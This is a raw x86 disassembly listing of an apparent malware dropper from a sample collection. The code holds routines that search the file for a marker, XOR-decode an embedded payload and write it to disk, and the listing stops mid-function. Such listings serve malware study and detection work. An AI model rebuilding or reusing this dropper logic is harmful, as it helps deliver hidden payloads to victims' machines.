
malware_samples/dropper/4aea25be20d037101e3d87f88ec22d0f3545e8f35e19d1b7ddc7db5154308fb2.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	81 ec 28 03 00 00    	sub    $0x328,%esp
  401009:	a3 28 ce 40 00       	mov    %eax,0x40ce28
  40100e:	89 0d 24 ce 40 00    	mov    %ecx,0x40ce24
  401014:	89 15 20 ce 40 00    	mov    %edx,0x40ce20
  40101a:	89 1d 1c ce 40 00    	mov    %ebx,0x40ce1c
  401020:	89 35 18 ce 40 00    	mov    %esi,0x40ce18
  401026:	89 3d 14 ce 40 00    	mov    %edi,0x40ce14
  40102c:	66 8c 15 40 ce 40 00 	data16 mov %ss,0x40ce40
  401033:	66 8c 0d 34 ce 40 00 	data16 mov %cs,0x40ce34
  40103a:	66 8c 1d 10 ce 40 00 	data16 mov %ds,0x40ce10
  401041:	66 8c 05 0c ce 40 00 	data16 mov %es,0x40ce0c
  401048:	66 8c 25 08 ce 40 00 	data16 mov %fs,0x40ce08
  40104f:	66 8c 2d 04 ce 40 00 	data16 mov %gs,0x40ce04
  401056:	9c                   	pushf
  401057:	8f 05 38 ce 40 00    	pop    0x40ce38
  40105d:	8b 45 00             	mov    0x0(%ebp),%eax
  401060:	a3 2c ce 40 00       	mov    %eax,0x40ce2c
  401065:	8b 45 04             	mov    0x4(%ebp),%eax
  401068:	a3 30 ce 40 00       	mov    %eax,0x40ce30
  40106d:	8d 45 08             	lea    0x8(%ebp),%eax
  401070:	a3 3c ce 40 00       	mov    %eax,0x40ce3c
  401075:	8b 85 e0 fc ff ff    	mov    -0x320(%ebp),%eax
  40107b:	c7 05 78 cd 40 00 01 	movl   $0x10001,0x40cd78
  401082:	00 01 00 
  401085:	a1 30 ce 40 00       	mov    0x40ce30,%eax
  40108a:	a3 2c cd 40 00       	mov    %eax,0x40cd2c
  40108f:	c7 05 20 cd 40 00 09 	movl   $0xc0000409,0x40cd20
  401096:	04 00 c0 
  401099:	c7 05 24 cd 40 00 01 	movl   $0x1,0x40cd24
  4010a0:	00 00 00 
  4010a3:	a1 20 c0 40 00       	mov    0x40c020,%eax
  4010a8:	89 85 d8 fc ff ff    	mov    %eax,-0x328(%ebp)
  4010ae:	a1 24 c0 40 00       	mov    0x40c024,%eax
  4010b3:	89 85 dc fc ff ff    	mov    %eax,-0x324(%ebp)
  4010b9:	83 25 70 cd 40 00 00 	andl   $0x0,0x40cd70
  4010c0:	6a 01                	push   $0x1
  4010c2:	e8 8d 0e 00 00       	call   0x401f54
  4010c7:	59                   	pop    %ecx
  4010c8:	6a 00                	push   $0x0
  4010ca:	ff 15 0c 90 40 00    	call   *0x40900c
  4010d0:	68 b8 91 40 00       	push   $0x4091b8
  4010d5:	ff 15 54 90 40 00    	call   *0x409054
  4010db:	83 3d 70 cd 40 00 00 	cmpl   $0x0,0x40cd70
  4010e2:	75 08                	jne    0x4010ec
  4010e4:	6a 01                	push   $0x1
  4010e6:	e8 69 0e 00 00       	call   0x401f54
  4010eb:	59                   	pop    %ecx
  4010ec:	68 09 04 00 c0       	push   $0xc0000409
  4010f1:	ff 15 8c 90 40 00    	call   *0x40908c
  4010f7:	50                   	push   %eax
  4010f8:	ff 15 94 90 40 00    	call   *0x409094
  4010fe:	c9                   	leave
  4010ff:	c3                   	ret
  401100:	8b 44 24 04          	mov    0x4(%esp),%eax
  401104:	a3 c0 d7 40 00       	mov    %eax,0x40d7c0
  401109:	c3                   	ret
  40110a:	55                   	push   %ebp
  40110b:	8d ac 24 58 fd ff ff 	lea    -0x2a8(%esp),%ebp
  401112:	81 ec 28 03 00 00    	sub    $0x328,%esp
  401118:	a1 20 c0 40 00       	mov    0x40c020,%eax
  40111d:	33 c5                	xor    %ebp,%eax
  40111f:	89 85 a4 02 00 00    	mov    %eax,0x2a4(%ebp)
  401125:	56                   	push   %esi
  401126:	89 85 88 00 00 00    	mov    %eax,0x88(%ebp)
  40112c:	89 8d 84 00 00 00    	mov    %ecx,0x84(%ebp)
  401132:	89 95 80 00 00 00    	mov    %edx,0x80(%ebp)
  401138:	89 5d 7c             	mov    %ebx,0x7c(%ebp)
  40113b:	89 75 78             	mov    %esi,0x78(%ebp)
  40113e:	89 7d 74             	mov    %edi,0x74(%ebp)
  401141:	66 8c 95 a0 00 00 00 	data16 mov %ss,0xa0(%ebp)
  401148:	66 8c 8d 94 00 00 00 	data16 mov %cs,0x94(%ebp)
  40114f:	66 8c 5d 70          	data16 mov %ds,0x70(%ebp)
  401153:	66 8c 45 6c          	data16 mov %es,0x6c(%ebp)
  401157:	66 8c 65 68          	data16 mov %fs,0x68(%ebp)
  40115b:	66 8c 6d 64          	data16 mov %gs,0x64(%ebp)
  40115f:	9c                   	pushf
  401160:	8f 85 98 00 00 00    	pop    0x98(%ebp)
  401166:	8b b5 ac 02 00 00    	mov    0x2ac(%ebp),%esi
  40116c:	8d 85 ac 02 00 00    	lea    0x2ac(%ebp),%eax
  401172:	89 85 9c 00 00 00    	mov    %eax,0x9c(%ebp)
  401178:	c7 45 d8 01 00 01 00 	movl   $0x10001,-0x28(%ebp)
  40117f:	89 b5 90 00 00 00    	mov    %esi,0x90(%ebp)
  401185:	8b 40 fc             	mov    -0x4(%eax),%eax
  401188:	6a 50                	push   $0x50
  40118a:	89 85 8c 00 00 00    	mov    %eax,0x8c(%ebp)
  401190:	8d 45 80             	lea    -0x80(%ebp),%eax
  401193:	6a 00                	push   $0x0
  401195:	50                   	push   %eax
  401196:	e8 c5 0d 00 00       	call   0x401f60
  40119b:	8d 45 80             	lea    -0x80(%ebp),%eax
  40119e:	83 c4 0c             	add    $0xc,%esp
  4011a1:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4011a4:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4011a7:	6a 00                	push   $0x0
  4011a9:	c7 45 80 0d 00 00 c0 	movl   $0xc000000d,-0x80(%ebp)
  4011b0:	89 75 8c             	mov    %esi,-0x74(%ebp)
  4011b3:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4011b6:	ff 15 0c 90 40 00    	call   *0x40900c
  4011bc:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4011bf:	50                   	push   %eax
  4011c0:	ff 15 54 90 40 00    	call   *0x409054
  4011c6:	85 c0                	test   %eax,%eax
  4011c8:	75 08                	jne    0x4011d2
  4011ca:	6a 02                	push   $0x2
  4011cc:	e8 83 0d 00 00       	call   0x401f54
  4011d1:	59                   	pop    %ecx
  4011d2:	68 0d 00 00 c0       	push   $0xc000000d
  4011d7:	ff 15 8c 90 40 00    	call   *0x40908c
  4011dd:	50                   	push   %eax
  4011de:	ff 15 94 90 40 00    	call   *0x409094
  4011e4:	8b 8d a4 02 00 00    	mov    0x2a4(%ebp),%ecx
  4011ea:	33 cd                	xor    %ebp,%ecx
  4011ec:	5e                   	pop    %esi
  4011ed:	e8 e8 0d 00 00       	call   0x401fda
  4011f2:	81 c5 a8 02 00 00    	add    $0x2a8,%ebp
  4011f8:	c9                   	leave
  4011f9:	c3                   	ret
  4011fa:	55                   	push   %ebp
  4011fb:	8b ec                	mov    %esp,%ebp
  4011fd:	ff 35 c0 d7 40 00    	push   0x40d7c0
  401203:	e8 c4 0e 00 00       	call   0x4020cc
  401208:	85 c0                	test   %eax,%eax
  40120a:	59                   	pop    %ecx
  40120b:	74 03                	je     0x401210
  40120d:	5d                   	pop    %ebp
  40120e:	ff e0                	jmp    *%eax
  401210:	6a 02                	push   $0x2
  401212:	e8 3d 0d 00 00       	call   0x401f54
  401217:	59                   	pop    %ecx
  401218:	5d                   	pop    %ebp
  401219:	e9 ec fe ff ff       	jmp    0x40110a
  40121e:	55                   	push   %ebp
  40121f:	8b ec                	mov    %esp,%ebp
  401221:	b8 5c 15 00 00       	mov    $0x155c,%eax
  401226:	e8 a5 16 00 00       	call   0x4028d0
  40122b:	a1 20 c0 40 00       	mov    0x40c020,%eax
  401230:	33 c5                	xor    %ebp,%eax
  401232:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401235:	53                   	push   %ebx
  401236:	56                   	push   %esi
  401237:	57                   	push   %edi
  401238:	8b 7d 10             	mov    0x10(%ebp),%edi
  40123b:	33 db                	xor    %ebx,%ebx
  40123d:	68 02 7f 00 00       	push   $0x7f02
  401242:	53                   	push   %ebx
  401243:	89 1d 44 d0 40 00    	mov    %ebx,0x40d044
  401249:	ff 15 6c 91 40 00    	call   *0x40916c
  40124f:	50                   	push   %eax
  401250:	ff 15 70 91 40 00    	call   *0x409170
  401256:	8d 8d a4 ea ff ff    	lea    -0x155c(%ebp),%ecx
  40125c:	e8 5b 01 00 00       	call   0x4013bc
  401261:	be 00 08 00 00       	mov    $0x800,%esi
  401266:	56                   	push   %esi
  401267:	8d 85 ac f2 ff ff    	lea    -0xd54(%ebp),%eax
  40126d:	53                   	push   %ebx
  40126e:	50                   	push   %eax
  40126f:	e8 ec 0c 00 00       	call   0x401f60
  401274:	8b 1d 18 90 40 00    	mov    0x409018,%ebx
  40127a:	83 c4 0c             	add    $0xc,%esp
  40127d:	57                   	push   %edi
  40127e:	ff d3                	call   *%ebx
  401280:	3b c6                	cmp    %esi,%eax
  401282:	8b 35 14 90 40 00    	mov    0x409014,%esi
  401288:	7d 0a                	jge    0x401294
  40128a:	57                   	push   %edi
  40128b:	8d 85 ac f2 ff ff    	lea    -0xd54(%ebp),%eax
  401291:	50                   	push   %eax
  401292:	ff d6                	call   *%esi
  401294:	33 ff                	xor    %edi,%edi
  401296:	68 0e 01 00 00       	push   $0x10e
  40129b:	8d 85 ac fa ff ff    	lea    -0x554(%ebp),%eax
  4012a1:	57                   	push   %edi
  4012a2:	50                   	push   %eax
  4012a3:	89 bd b0 fb ff ff    	mov    %edi,-0x450(%ebp)
  4012a9:	e8 b2 0c 00 00       	call   0x401f60
  4012ae:	83 c4 0c             	add    $0xc,%esp
  4012b1:	39 3d 70 d0 40 00    	cmp    %edi,0x40d070
  4012b7:	0f 8e ad 00 00 00    	jle    0x40136a
  4012bd:	a1 74 d0 40 00       	mov    0x40d074,%eax
  4012c2:	ff 34 b8             	push   (%eax,%edi,4)
  4012c5:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  4012cb:	50                   	push   %eax
  4012cc:	ff d6                	call   *%esi
  4012ce:	80 bd ec fe ff ff 2f 	cmpb   $0x2f,-0x114(%ebp)
  4012d5:	75 66                	jne    0x40133d
  4012d7:	8a 85 ed fe ff ff    	mov    -0x113(%ebp),%al
  4012dd:	3c 54                	cmp    $0x54,%al
  4012df:	74 26                	je     0x401307
  4012e1:	3c 57                	cmp    $0x57,%al
  4012e3:	74 08                	je     0x4012ed
  4012e5:	3c 74                	cmp    $0x74,%al
  4012e7:	74 1e                	je     0x401307
  4012e9:	3c 77                	cmp    $0x77,%al
  4012eb:	75 50                	jne    0x40133d
  4012ed:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  4012f3:	50                   	push   %eax
  4012f4:	ff d3                	call   *%ebx
  4012f6:	83 f8 02             	cmp    $0x2,%eax
  4012f9:	75 42                	jne    0x40133d
  4012fb:	c7 85 b0 fb ff ff 01 	movl   $0x1,-0x450(%ebp)
  401302:	00 00 00 
  401305:	eb 36                	jmp    0x40133d
  401307:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  40130d:	50                   	push   %eax
  40130e:	ff d3                	call   *%ebx
  401310:	83 f8 03             	cmp    $0x3,%eax
  401313:	7e 28                	jle    0x40133d
  401315:	80 bd ee fe ff ff 3a 	cmpb   $0x3a,-0x112(%ebp)
  40131c:	75 1f                	jne    0x40133d
  40131e:	83 f8 03             	cmp    $0x3,%eax
  401321:	7e 1a                	jle    0x40133d
  401323:	83 c0 fd             	add    $0xfffffffd,%eax
  401326:	50                   	push   %eax
  401327:	8d 85 ef fe ff ff    	lea    -0x111(%ebp),%eax
  40132d:	50                   	push   %eax
  40132e:	8d 85 ac fa ff ff    	lea    -0x554(%ebp),%eax
  401334:	50                   	push   %eax
  401335:	e8 c6 15 00 00       	call   0x402900
  40133a:	83 c4 0c             	add    $0xc,%esp
  40133d:	68 d0 91 40 00       	push   $0x4091d0
  401342:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  401348:	50                   	push   %eax
  401349:	ff 15 10 90 40 00    	call   *0x409010
  40134f:	85 c0                	test   %eax,%eax
  401351:	75 0a                	jne    0x40135d
  401353:	c7 05 44 d0 40 00 01 	movl   $0x1,0x40d044
  40135a:	00 00 00 
  40135d:	47                   	inc    %edi
  40135e:	3b 3d 70 d0 40 00    	cmp    0x40d070,%edi
  401364:	0f 8c 53 ff ff ff    	jl     0x4012bd
  40136a:	8d 8d a4 ea ff ff    	lea    -0x155c(%ebp),%ecx
  401370:	e8 76 0b 00 00       	call   0x401eeb
  401375:	8b f0                	mov    %eax,%esi
  401377:	8d 46 ce             	lea    -0x32(%esi),%eax
  40137a:	83 f8 31             	cmp    $0x31,%eax
  40137d:	77 1f                	ja     0x40139e
  40137f:	83 bd b4 fb ff ff 00 	cmpl   $0x0,-0x44c(%ebp)
  401386:	75 16                	jne    0x40139e
  401388:	6a 10                	push   $0x10
  40138a:	68 c0 91 40 00       	push   $0x4091c0
  40138f:	8d 85 ac ea ff ff    	lea    -0x1554(%ebp),%eax
  401395:	50                   	push   %eax
  401396:	6a 00                	push   $0x0
  401398:	ff 15 74 91 40 00    	call   *0x409174
  40139e:	8d 8d a4 ea ff ff    	lea    -0x155c(%ebp),%ecx
  4013a4:	e8 7b 00 00 00       	call   0x401424
  4013a9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4013ac:	5f                   	pop    %edi
  4013ad:	8b c6                	mov    %esi,%eax
  4013af:	5e                   	pop    %esi
  4013b0:	33 cd                	xor    %ebp,%ecx
  4013b2:	5b                   	pop    %ebx
  4013b3:	e8 22 0c 00 00       	call   0x401fda
  4013b8:	c9                   	leave
  4013b9:	c2 10 00             	ret    $0x10
  4013bc:	56                   	push   %esi
  4013bd:	8b f1                	mov    %ecx,%esi
  4013bf:	57                   	push   %edi
  4013c0:	33 ff                	xor    %edi,%edi
  4013c2:	68 04 01 00 00       	push   $0x104
  4013c7:	8d 86 08 10 00 00    	lea    0x1008(%esi),%eax
  4013cd:	57                   	push   %edi
  4013ce:	50                   	push   %eax
  4013cf:	c7 06 dc 91 40 00    	movl   $0x4091dc,(%esi)
  4013d5:	89 be 2c 14 00 00    	mov    %edi,0x142c(%esi)
  4013db:	89 be 40 14 00 00    	mov    %edi,0x1440(%esi)
  4013e1:	89 be 30 14 00 00    	mov    %edi,0x1430(%esi)
  4013e7:	89 be 34 14 00 00    	mov    %edi,0x1434(%esi)
  4013ed:	89 be 38 14 00 00    	mov    %edi,0x1438(%esi)
  4013f3:	89 be 3c 14 00 00    	mov    %edi,0x143c(%esi)
  4013f9:	e8 62 0b 00 00       	call   0x401f60
  4013fe:	83 c4 0c             	add    $0xc,%esp
  401401:	89 be 0c 11 00 00    	mov    %edi,0x110c(%esi)
  401407:	89 be 44 14 00 00    	mov    %edi,0x1444(%esi)
  40140d:	89 be 10 11 00 00    	mov    %edi,0x1110(%esi)
  401413:	89 be 18 11 00 00    	mov    %edi,0x1118(%esi)
  401419:	89 be 1c 11 00 00    	mov    %edi,0x111c(%esi)
  40141f:	5f                   	pop    %edi
  401420:	8b c6                	mov    %esi,%eax
  401422:	5e                   	pop    %esi
  401423:	c3                   	ret
  401424:	c7 01 dc 91 40 00    	movl   $0x4091dc,(%ecx)
  40142a:	8b 89 2c 14 00 00    	mov    0x142c(%ecx),%ecx
  401430:	83 f9 ff             	cmp    $0xffffffff,%ecx
  401433:	74 07                	je     0x40143c
  401435:	51                   	push   %ecx
  401436:	ff 15 1c 90 40 00    	call   *0x40901c
  40143c:	c3                   	ret
  40143d:	68 04 01 00 00       	push   $0x104
  401442:	81 c1 20 11 00 00    	add    $0x1120,%ecx
  401448:	51                   	push   %ecx
  401449:	6a 00                	push   $0x0
  40144b:	ff 15 20 90 40 00    	call   *0x409020
  401451:	c3                   	ret
  401452:	83 ec 0c             	sub    $0xc,%esp
  401455:	53                   	push   %ebx
  401456:	55                   	push   %ebp
  401457:	56                   	push   %esi
  401458:	57                   	push   %edi
  401459:	8b f1                	mov    %ecx,%esi
  40145b:	33 ed                	xor    %ebp,%ebp
  40145d:	55                   	push   %ebp
  40145e:	8d 86 20 11 00 00    	lea    0x1120(%esi),%eax
  401464:	bb 00 7d 00 00       	mov    $0x7d00,%ebx
  401469:	50                   	push   %eax
  40146a:	89 6c 24 1c          	mov    %ebp,0x1c(%esp)
  40146e:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  401472:	ff 15 2c 90 40 00    	call   *0x40902c
  401478:	83 f8 ff             	cmp    $0xffffffff,%eax
  40147b:	89 86 2c 14 00 00    	mov    %eax,0x142c(%esi)
  401481:	75 20                	jne    0x4014a3
  401483:	68 b4 92 40 00       	push   $0x4092b4
  401488:	83 c6 08             	add    $0x8,%esi
  40148b:	56                   	push   %esi
  40148c:	ff 15 14 90 40 00    	call   *0x409014
  401492:	8b 7c 24 18          	mov    0x18(%esp),%edi
  401496:	c7 44 24 14 32 00 00 	movl   $0x32,0x14(%esp)
  40149d:	00 
  40149e:	e9 34 02 00 00       	jmp    0x4016d7
  4014a3:	68 00 f4 01 00       	push   $0x1f400
  4014a8:	e8 bf 18 00 00       	call   0x402d6c
  4014ad:	8b f8                	mov    %eax,%edi
  4014af:	3b fd                	cmp    %ebp,%edi
  4014b1:	59                   	pop    %ecx
  4014b2:	75 1c                	jne    0x4014d0
  4014b4:	68 90 92 40 00       	push   $0x409290
  4014b9:	83 c6 08             	add    $0x8,%esi
  4014bc:	56                   	push   %esi
  4014bd:	ff 15 14 90 40 00    	call   *0x409014
  4014c3:	c7 44 24 14 33 00 00 	movl   $0x33,0x14(%esp)
  4014ca:	00 
  4014cb:	e9 07 02 00 00       	jmp    0x4016d7
  4014d0:	55                   	push   %ebp
  4014d1:	8b 2d 28 90 40 00    	mov    0x409028,%ebp
  4014d7:	53                   	push   %ebx
  4014d8:	ff b6 2c 14 00 00    	push   0x142c(%esi)
  4014de:	ff d5                	call   *%ebp
  4014e0:	8b 1d 24 90 40 00    	mov    0x409024,%ebx
  4014e6:	81 7c 24 18 00 00 a0 	cmpl   $0xa00000,0x18(%esp)
  4014ed:	00 
  4014ee:	0f 83 d2 00 00 00    	jae    0x4015c6
  4014f4:	68 00 f4 01 00       	push   $0x1f400
  4014f9:	57                   	push   %edi
  4014fa:	ff b6 2c 14 00 00    	push   0x142c(%esi)
  401500:	ff d3                	call   *%ebx
  401502:	33 c9                	xor    %ecx,%ecx
  401504:	85 c0                	test   %eax,%eax
  401506:	76 74                	jbe    0x40157c
  401508:	80 3c 39 e0          	cmpb   $0xe0,(%ecx,%edi,1)
  40150c:	75 69                	jne    0x401577
  40150e:	80 7c 39 01 e0       	cmpb   $0xe0,0x1(%ecx,%edi,1)
  401513:	75 62                	jne    0x401577
  401515:	80 7c 39 02 e1       	cmpb   $0xe1,0x2(%ecx,%edi,1)
  40151a:	75 5b                	jne    0x401577
  40151c:	80 7c 39 03 e1       	cmpb   $0xe1,0x3(%ecx,%edi,1)
  401521:	75 54                	jne    0x401577
  401523:	80 7c 39 04 e2       	cmpb   $0xe2,0x4(%ecx,%edi,1)
  401528:	75 4d                	jne    0x401577
  40152a:	80 7c 39 05 e2       	cmpb   $0xe2,0x5(%ecx,%edi,1)
  40152f:	75 46                	jne    0x401577
  401531:	80 7c 39 06 e3       	cmpb   $0xe3,0x6(%ecx,%edi,1)
  401536:	75 3f                	jne    0x401577
  401538:	80 7c 39 07 e3       	cmpb   $0xe3,0x7(%ecx,%edi,1)
  40153d:	75 38                	jne    0x401577
  40153f:	80 7c 39 08 e4       	cmpb   $0xe4,0x8(%ecx,%edi,1)
  401544:	75 31                	jne    0x401577
  401546:	80 7c 39 09 e4       	cmpb   $0xe4,0x9(%ecx,%edi,1)
  40154b:	75 2a                	jne    0x401577
  40154d:	80 7c 39 0a e5       	cmpb   $0xe5,0xa(%ecx,%edi,1)
  401552:	75 23                	jne    0x401577
  401554:	80 7c 39 0b e5       	cmpb   $0xe5,0xb(%ecx,%edi,1)
  401559:	75 1c                	jne    0x401577
  40155b:	80 7c 39 0c e6       	cmpb   $0xe6,0xc(%ecx,%edi,1)
  401560:	75 15                	jne    0x401577
  401562:	80 7c 39 0d e6       	cmpb   $0xe6,0xd(%ecx,%edi,1)
  401567:	75 0e                	jne    0x401577
  401569:	80 7c 39 0e e7       	cmpb   $0xe7,0xe(%ecx,%edi,1)
  40156e:	75 07                	jne    0x401577
  401570:	80 7c 39 0f e7       	cmpb   $0xe7,0xf(%ecx,%edi,1)
  401575:	74 0e                	je     0x401585
  401577:	41                   	inc    %ecx
  401578:	3b c8                	cmp    %eax,%ecx
  40157a:	72 8c                	jb     0x401508
  40157c:	01 44 24 18          	add    %eax,0x18(%esp)
  401580:	e9 61 ff ff ff       	jmp    0x4014e6
  401585:	8b 44 24 18          	mov    0x18(%esp),%eax
  401589:	83 a6 34 14 00 00 00 	andl   $0x0,0x1434(%esi)
  401590:	8d 4c 08 10          	lea    0x10(%eax,%ecx,1),%ecx
  401594:	6a 00                	push   $0x0
  401596:	51                   	push   %ecx
  401597:	ff b6 2c 14 00 00    	push   0x142c(%esi)
  40159d:	89 8e 30 14 00 00    	mov    %ecx,0x1430(%esi)
  4015a3:	c6 44 24 1f 00       	movb   $0x0,0x1f(%esp)
  4015a8:	ff d5                	call   *%ebp
  4015aa:	33 ed                	xor    %ebp,%ebp
  4015ac:	45                   	inc    %ebp
  4015ad:	55                   	push   %ebp
  4015ae:	8d 44 24 17          	lea    0x17(%esp),%eax
  4015b2:	50                   	push   %eax
  4015b3:	ff b6 2c 14 00 00    	push   0x142c(%esi)
  4015b9:	ff d3                	call   *%ebx
  4015bb:	3b c5                	cmp    %ebp,%eax
  4015bd:	74 23                	je     0x4015e2
  4015bf:	68 68 92 40 00       	push   $0x409268
  4015c4:	eb 05                	jmp    0x4015cb
  4015c6:	68 4c 92 40 00       	push   $0x40924c
  4015cb:	83 c6 08             	add    $0x8,%esi
  4015ce:	56                   	push   %esi
  4015cf:	ff 15 14 90 40 00    	call   *0x409014
  4015d5:	c7 44 24 14 34 00 00 	movl   $0x34,0x14(%esp)
  4015dc:	00 
  4015dd:	e9 f5 00 00 00       	jmp    0x4016d7
  4015e2:	01 ae 30 14 00 00    	add    %ebp,0x1430(%esi)
  4015e8:	83 96 34 14 00 00 00 	adcl   $0x0,0x1434(%esi)
  4015ef:	80 7c 24 13 00       	cmpb   $0x0,0x13(%esp)
  4015f4:	75 06                	jne    0x4015fc
  4015f6:	89 ae 0c 11 00 00    	mov    %ebp,0x110c(%esi)
  4015fc:	6a 00                	push   $0x0
  4015fe:	ff b6 30 14 00 00    	push   0x1430(%esi)
  401604:	8d ae 14 11 00 00    	lea    0x1114(%esi),%ebp
  40160a:	ff b6 2c 14 00 00    	push   0x142c(%esi)
  401610:	c6 45 00 00          	movb   $0x0,0x0(%ebp)
  401614:	ff 15 28 90 40 00    	call   *0x409028
  40161a:	6a 01                	push   $0x1
  40161c:	55                   	push   %ebp
  40161d:	ff b6 2c 14 00 00    	push   0x142c(%esi)
  401623:	ff d3                	call   *%ebx
  401625:	83 f8 01             	cmp    $0x1,%eax
  401628:	74 07                	je     0x401631
  40162a:	68 20 92 40 00       	push   $0x409220
  40162f:	eb 9a                	jmp    0x4015cb
  401631:	83 86 30 14 00 00 01 	addl   $0x1,0x1430(%esi)
  401638:	8d ae 18 11 00 00    	lea    0x1118(%esi),%ebp
  40163e:	83 96 34 14 00 00 00 	adcl   $0x0,0x1434(%esi)
  401645:	33 c0                	xor    %eax,%eax
  401647:	50                   	push   %eax
  401648:	ff b6 30 14 00 00    	push   0x1430(%esi)
  40164e:	89 45 00             	mov    %eax,0x0(%ebp)
  401651:	ff b6 2c 14 00 00    	push   0x142c(%esi)
  401657:	89 45 04             	mov    %eax,0x4(%ebp)
  40165a:	ff 15 28 90 40 00    	call   *0x409028
  401660:	6a 08                	push   $0x8
  401662:	55                   	push   %ebp
  401663:	ff b6 2c 14 00 00    	push   0x142c(%esi)
  401669:	ff d3                	call   *%ebx
  40166b:	6a 08                	push   $0x8
  40166d:	5d                   	pop    %ebp
  40166e:	3b c5                	cmp    %ebp,%eax
  401670:	74 0a                	je     0x40167c
  401672:	68 fc 91 40 00       	push   $0x4091fc
  401677:	e9 4f ff ff ff       	jmp    0x4015cb
  40167c:	01 ae 30 14 00 00    	add    %ebp,0x1430(%esi)
  401682:	6a 00                	push   $0x0
  401684:	83 96 34 14 00 00 00 	adcl   $0x0,0x1434(%esi)
  40168b:	ff b6 30 14 00 00    	push   0x1430(%esi)
  401691:	ff b6 2c 14 00 00    	push   0x142c(%esi)
  401697:	ff 15 28 90 40 00    	call   *0x409028
  40169d:	55                   	push   %ebp
  40169e:	8d 86 38 14 00 00    	lea    0x1438(%esi),%eax
  4016a4:	50                   	push   %eax
  4016a5:	ff b6 2c 14 00 00    	push   0x142c(%esi)
  4016ab:	ff d3                	call   *%ebx
  4016ad:	3b c5                	cmp    %ebp,%eax
  4016af:	74 19                	je     0x4016ca
  4016b1:	68 e0 91 40 00       	push   $0x4091e0
  4016b6:	83 c6 08             	add    $0x8,%esi
  4016b9:	56                   	push   %esi
  4016ba:	ff 15 14 90 40 00    	call   *0x409014
  4016c0:	c7 44 24 14 35 00 00 	movl   $0x35,0x14(%esp)
  4016c7:	00 
  4016c8:	eb 0d                	jmp    0x4016d7
  4016ca:	01 ae 30 14 00 00    	add    %ebp,0x1430(%esi)
  4016d0:	83 96 34 14 00 00 00 	adcl   $0x0,0x1434(%esi)
  4016d7:	57                   	push   %edi
  4016d8:	e8 b2 15 00 00       	call   0x402c8f
  4016dd:	8b 44 24 18          	mov    0x18(%esp),%eax
  4016e1:	59                   	pop    %ecx
  4016e2:	5f                   	pop    %edi
  4016e3:	5e                   	pop    %esi
  4016e4:	5d                   	pop    %ebp
  4016e5:	5b                   	pop    %ebx
  4016e6:	83 c4 0c             	add    $0xc,%esp
  4016e9:	c3                   	ret
  4016ea:	53                   	push   %ebx
  4016eb:	55                   	push   %ebp
  4016ec:	56                   	push   %esi
  4016ed:	8b f1                	mov    %ecx,%esi
  4016ef:	57                   	push   %edi
  4016f0:	ff b6 38 14 00 00    	push   0x1438(%esi)
  4016f6:	33 ed                	xor    %ebp,%ebp
  4016f8:	e8 6f 16 00 00       	call   0x402d6c
  4016fd:	59                   	pop    %ecx
  4016fe:	55                   	push   %ebp
  4016ff:	ff b6 30 14 00 00    	push   0x1430(%esi)
  401705:	8d be 2c 14 00 00    	lea    0x142c(%esi),%edi
  40170b:	ff 37                	push   (%edi)
  40170d:	8b d8                	mov    %eax,%ebx
  40170f:	ff 15 28 90 40 00    	call   *0x409028
  401715:	ff b6 38 14 00 00    	push   0x1438(%esi)
  40171b:	53                   	push   %ebx
  40171c:	ff 37                	push   (%edi)
  40171e:	ff 15 24 90 40 00    	call   *0x409024
  401724:	33 c9                	xor    %ecx,%ecx
  401726:	3b 86 38 14 00 00    	cmp    0x1438(%esi),%eax
  40172c:	75 57                	jne    0x401785
  40172e:	3b 8e 3c 14 00 00    	cmp    0x143c(%esi),%ecx
  401734:	75 4f                	jne    0x401785
  401736:	51                   	push   %ecx
  401737:	8d 86 24 12 00 00    	lea    0x1224(%esi),%eax
  40173d:	50                   	push   %eax
  40173e:	ff 15 34 90 40 00    	call   *0x409034
  401744:	83 f8 ff             	cmp    $0xffffffff,%eax
  401747:	89 86 40 14 00 00    	mov    %eax,0x1440(%esi)
  40174d:	75 13                	jne    0x401762
  40174f:	68 ec 92 40 00       	push   $0x4092ec
  401754:	8d 46 08             	lea    0x8(%esi),%eax
  401757:	50                   	push   %eax
  401758:	ff 15 14 90 40 00    	call   *0x409014
  40175e:	6a 37                	push   $0x37
  401760:	eb 34                	jmp    0x401796
  401762:	33 c0                	xor    %eax,%eax
  401764:	80 34 18 07          	xorb   $0x7,(%eax,%ebx,1)
  401768:	40                   	inc    %eax
  401769:	3d d0 07 00 00       	cmp    $0x7d0,%eax
  40176e:	7c f4                	jl     0x401764
  401770:	ff b6 38 14 00 00    	push   0x1438(%esi)
  401776:	53                   	push   %ebx
  401777:	ff b6 40 14 00 00    	push   0x1440(%esi)
  40177d:	ff 15 30 90 40 00    	call   *0x409030
  401783:	eb 12                	jmp    0x401797
  401785:	68 d0 92 40 00       	push   $0x4092d0
  40178a:	8d 46 08             	lea    0x8(%esi),%eax
  40178d:	50                   	push   %eax
  40178e:	ff 15 14 90 40 00    	call   *0x409014
  401794:	6a 36                	push   $0x36
  401796:	5d                   	pop    %ebp
  401797:	53                   	push   %ebx
  401798:	e8 f2 14 00 00       	call   0x402c8f
  40179d:	8b b6 40 14 00 00    	mov    0x1440(%esi),%esi
  4017a3:	83 fe ff             	cmp    $0xffffffff,%esi
  4017a6:	59                   	pop    %ecx
  4017a7:	74 07                	je     0x4017b0
  4017a9:	56                   	push   %esi
  4017aa:	ff 15 1c 90 40 00    	call   *0x40901c
  4017b0:	5f                   	pop    %edi
  4017b1:	5e                   	pop    %esi
  4017b2:	8b c5                	mov    %ebp,%eax
  4017b4:	5d                   	pop    %ebp
  4017b5:	5b                   	pop    %ebx
  4017b6:	c3                   	ret
  4017b7:	55                   	push   %ebp
  4017b8:	8d ac 24 74 ff ff ff 	lea    -0x8c(%esp),%ebp
  4017bf:	81 ec 0c 01 00 00    	sub    $0x10c,%esp
  4017c5:	a1 20 c0 40 00       	mov    0x40c020,%eax
